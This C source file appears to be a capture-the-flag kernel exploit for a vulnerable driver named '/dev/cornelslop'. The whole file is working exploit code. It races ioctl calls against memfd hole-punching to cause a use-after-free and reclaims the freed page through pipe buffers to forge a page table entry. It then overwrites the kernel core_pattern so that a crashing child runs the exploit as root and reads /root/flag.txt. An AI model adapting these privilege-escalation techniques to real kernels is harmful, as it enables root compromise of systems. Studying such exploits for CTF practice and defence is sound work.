#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sched.h>
#include <stdatomic.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/sendfile.h>
#include <sys/resource.h>
#define MEMBARRIER_CMD_GLOBAL (1 << 0)

#define DEVICE_PATH "/dev/cornelslop"

#define ADD_ENTRY   0xcafebabe
#define DEL_ENTRY   0xdeadbabe
#define CHECK_ENTRY 0xbeefbabe

#define SYSCHK(x) ({          \
  typeof(x) __res = (x);      \
  if (__res == (typeof(x))-1) \
    err(1, "SYSCHK(" #x ")"); \
  __res;                      \
})

int fd;
int memfd;

struct cornelslop_user_entry {
    unsigned int id;
    unsigned long va_start;
    unsigned long va_end;
    unsigned char corrupted;
};

static unsigned int add_entry(void *buf, size_t len)
{
    struct cornelslop_user_entry ue;

    memset(&ue, 0, sizeof(ue));
    ue.va_start = (uint64_t)buf;
    ue.va_end   = (uint64_t)buf + len;

    //SYSCHK(ioctl(fd, ADD_ENTRY, &ue));
    ioctl(fd, ADD_ENTRY, &ue);

    return ue.id;
}

static int check_entry(uint32_t id)
{
    struct cornelslop_user_entry ue;

    memset(&ue, 0, sizeof(ue));
    ue.id = id;

    return ioctl(fd, CHECK_ENTRY, &ue);
}

static void del_entry(uint32_t id)
{
    struct cornelslop_user_entry ue;

    memset(&ue, 0, sizeof(ue));
    ue.id = id;

    ioctl(fd, DEL_ENTRY, &ue);
}

void pin_on_cpu(int i)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(i, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

void nsleep(uint64_t ns)
{
    struct timespec ts;

    ts.tv_sec  = ns / 1000000000ULL;
    ts.tv_nsec = ns % 1000000000ULL;

    nanosleep(&ts, NULL);
}

// #define MAX_LEN 256 * 1024 * 1024
#define MAX_LEN 256 * 1024 * 1024
pthread_barrier_t barrier;
unsigned int target_id;
void *dummy_buf;
void *buf;
int stop = 0;

void *race(void *dummy)
{
    pin_on_cpu(1);
    pthread_barrier_wait(&barrier);
    nsleep(20);
    del_entry(target_id);
}

void *hole_punch_thread(void *dummy)
{
    pin_on_cpu(2);
    pthread_barrier_wait(&barrier);
    SYSCHK(fallocate(memfd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE, 0, MAX_LEN));
}

void *hole_punch_thread_with_stop(void *dummy)
{
    pin_on_cpu(2);
    pthread_barrier_wait(&barrier);
    while (!stop) {
        usleep(50);
        SYSCHK(fallocate(memfd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE, 0, MAX_LEN));
    }
}

int uaf_good = 1;
int uaf_id;
void *reclaim_thread(void *dummy)
{
    memset(dummy_buf, 'A', 0x1000);

    pin_on_cpu(3);
    pthread_barrier_wait(&barrier);
    SYSCHK(syscall(__NR_membarrier, MEMBARRIER_CMD_GLOBAL, 0, -1)); // 0 has been freed
    SYSCHK(syscall(__NR_membarrier, MEMBARRIER_CMD_GLOBAL, 0, -1)); // Q.Q
    // SYSCHK(syscall(__NR_membarrier, MEMBARRIER_CMD_GLOBAL, 0, -1)); // 0 has been freed

    int ents[55];
    for (int i = 0; i < 55; i++) { // id 0~54
        ents[i] = add_entry(dummy_buf, 0x1000);
    }

    uaf_id = add_entry(dummy_buf, 0x1000); // 55, UAF object
    for (int i = 0; i < 55; i++) { // id 0~54
        del_entry(ents[i]);
    }
    if (uaf_id != 55) {
        printf("[-] uaf_id: %d (should be 55)\n", uaf_id);
        uaf_good = 0;
    }

    SYSCHK(syscall(__NR_membarrier, MEMBARRIER_CMD_GLOBAL, 0, -1)); // 55 is freed
}

#define STAGE2_RACE_COUNT 1024
atomic_int counter = 0;
void *add_entry_thread(void *dummy)
{
    unsigned long not_so_long_size = 256 * 1024 * 50;
    pin_on_cpu(3);
    pthread_barrier_wait(&barrier);
    nsleep(10);
    add_entry(buf + (MAX_LEN - not_so_long_size) + 0x1000 /* access unmapped */, not_so_long_size);
    atomic_fetch_add(&counter, 1);
}

#define PIPE_COUNT 2000 + 1
int pipefd[PIPE_COUNT][2];
int main(int argc, char **argv)
{
    if (argc > 1) {
        int pid = strtoull(argv[1], 0, 10);
        int pfd = syscall(SYS_pidfd_open, pid, 0);
        int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
        int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
        int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
        dup2(stdinfd, 0);
        dup2(stdoutfd, 1);
        dup2(stderrfd, 2);
        system("cat /root/flag.txt; sleep 133337;");
    }

    {
        int memfd = memfd_create("", 0);
        SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
        dup2(memfd, 666);
        close(memfd);
    }

    pthread_t tid1, tid2, tid3;

    {
        struct rlimit rl;
        SYSCHK(getrlimit(RLIMIT_NOFILE, &rl));
        rl.rlim_cur = rl.rlim_max;
        SYSCHK(setrlimit(RLIMIT_NOFILE, &rl));
        printf("nofile limit set to %ld\n", rl.rlim_cur);
    }

    {
        pthread_barrier_init(&barrier, NULL, 4);
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stderr, NULL, _IONBF, 0);
        SYSCHK(fd = open(DEVICE_PATH, O_RDONLY));
        SYSCHK(dummy_buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON | MAP_POPULATE, -1, 0));
        for (int i = 0; i < PIPE_COUNT; i++) {
            SYSCHK(pipe(pipefd[i]));
        }

        #define BASE_MMAP_ADDR ((void *)0x80000000UL) // 1 << 9 << 9 << 9
        SYSCHK(mmap(BASE_MMAP_ADDR, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_POPULATE, -1, 0));
    }

    {
        SYSCHK(memfd = memfd_create("", 0)); 
        SYSCHK(fallocate(memfd, 0, 0, MAX_LEN));
        SYSCHK(buf = mmap((void *)0x123400000UL, MAX_LEN, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, memfd, 0));
    }

    while (1) {
        pin_on_cpu(3);
        {
            target_id = add_entry(buf, MAX_LEN);
            SYSCHK(madvise(buf, MAX_LEN, MADV_DONTNEED));
        }

        // ================== stage 1 ==================
        pin_on_cpu(0);
        pthread_create(&tid1, NULL, race, NULL);
        pthread_create(&tid2, NULL, hole_punch_thread, NULL);
        pthread_create(&tid3, NULL, reclaim_thread, NULL);

        pthread_barrier_wait(&barrier);
        nsleep(10);
        int retval = check_entry(target_id);

        pthread_join(tid1, NULL);
        pthread_join(tid2, NULL);
        pthread_join(tid3, NULL);

        if (uaf_good == 0) {
            return -1;
        }

        if (retval == 0) break;
        for (int i = 0; i < 128; i++) {
            del_entry(i);
        }
    }

    sleep(3);
    // ================== stage 2 ==================
    pthread_t dummy;
    pthread_barrier_destroy(&barrier);
    pthread_barrier_init(&barrier, NULL, STAGE2_RACE_COUNT + 1 /* hole punch */ + 1 /* main */);
    SYSCHK(madvise(buf, MAX_LEN, MADV_DONTNEED));

    for (int i = 0; i < STAGE2_RACE_COUNT; i++) {
        pthread_create(&dummy, NULL, add_entry_thread, NULL);
    }
    pthread_create(&dummy, NULL, hole_punch_thread_with_stop, NULL);
    stop = 0;

    pthread_barrier_wait(&barrier); // start !!
    while (1) {
        int cnt = atomic_load(&counter);
        printf("finish: %d\n", cnt);
        if (cnt == STAGE2_RACE_COUNT)
            break;

        sleep(1);
    }
    stop = 1;
    sleep(3);

    // ================== stage 3 ==================
    memset(dummy_buf, 'A', 0x1000);
    for (int i = 0; i < PIPE_COUNT - 1; i++) {
        write(pipefd[i][1], dummy_buf, 0x1000);
    }

    del_entry(uaf_id);
    SYSCHK(syscall(__NR_membarrier, MEMBARRIER_CMD_GLOBAL, 0, -1));

    sleep(2);
    memset(dummy_buf, 'B', 0x1000);
    write(pipefd[PIPE_COUNT - 1][1], dummy_buf, 0x1000);

    int target_pipe = -1;
    for (int i = 0; i < PIPE_COUNT - 1; i++) {
        read(pipefd[i][0], dummy_buf, 0x1000);
        if (*(char *)dummy_buf == 'B') {
            printf("UAF page @ %d\n", i);
            target_pipe = i;
            break;
        }
    }

    if (target_pipe == -1) {
        printf("failed...\n");
        return -1;
    }

    write(pipefd[target_pipe][1], dummy_buf, 0x1000);
    close(pipefd[PIPE_COUNT - 1][0]);
    close(pipefd[PIPE_COUNT - 1][1]);

    for (int i = 1; i < 512; i++) {
        void *ptr = (void *)BASE_MMAP_ADDR + i * 0x200000 /* 1 << 9 */;
        SYSCHK(mmap(ptr, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0));
        if (*(volatile char *)ptr) printf("owo\n");
    }

    read(pipefd[target_pipe][0], dummy_buf, 0x1000);
    unsigned long empty_zero_page_pte = *(unsigned long *)dummy_buf;
    printf("PTE %lx\n", empty_zero_page_pte);
    empty_zero_page_pte &= ~0xfff;
    empty_zero_page_pte |= 0x67;

    // empty_zero_page ~ core_pattern
    #define LOCAL_DIFF 0x9fc000
    #define REMOTE_DIFF 0x9f9000

    *(unsigned long *)dummy_buf = empty_zero_page_pte - REMOTE_DIFF;
    write(pipefd[target_pipe][1], dummy_buf, 0x1000);

    #define FAKE_CORE_PATTERN "|/proc/%P/fd/666 %P "
    #define LOCAL_OFFSET 0x9c0
    #define REMOTE_OFFSET 0xc00
    for (int i = 1; i < 512; i++) {
        void *ptr = (void *)BASE_MMAP_ADDR + i * 0x200000 /* 1 << 9 */;
        strcpy(ptr + REMOTE_OFFSET, FAKE_CORE_PATTERN);
    }

    if (!fork()) { // trigger core_pattern
        *(volatile size_t *)0 = 0;
    }
    sleep(-1);

    return 0;
}
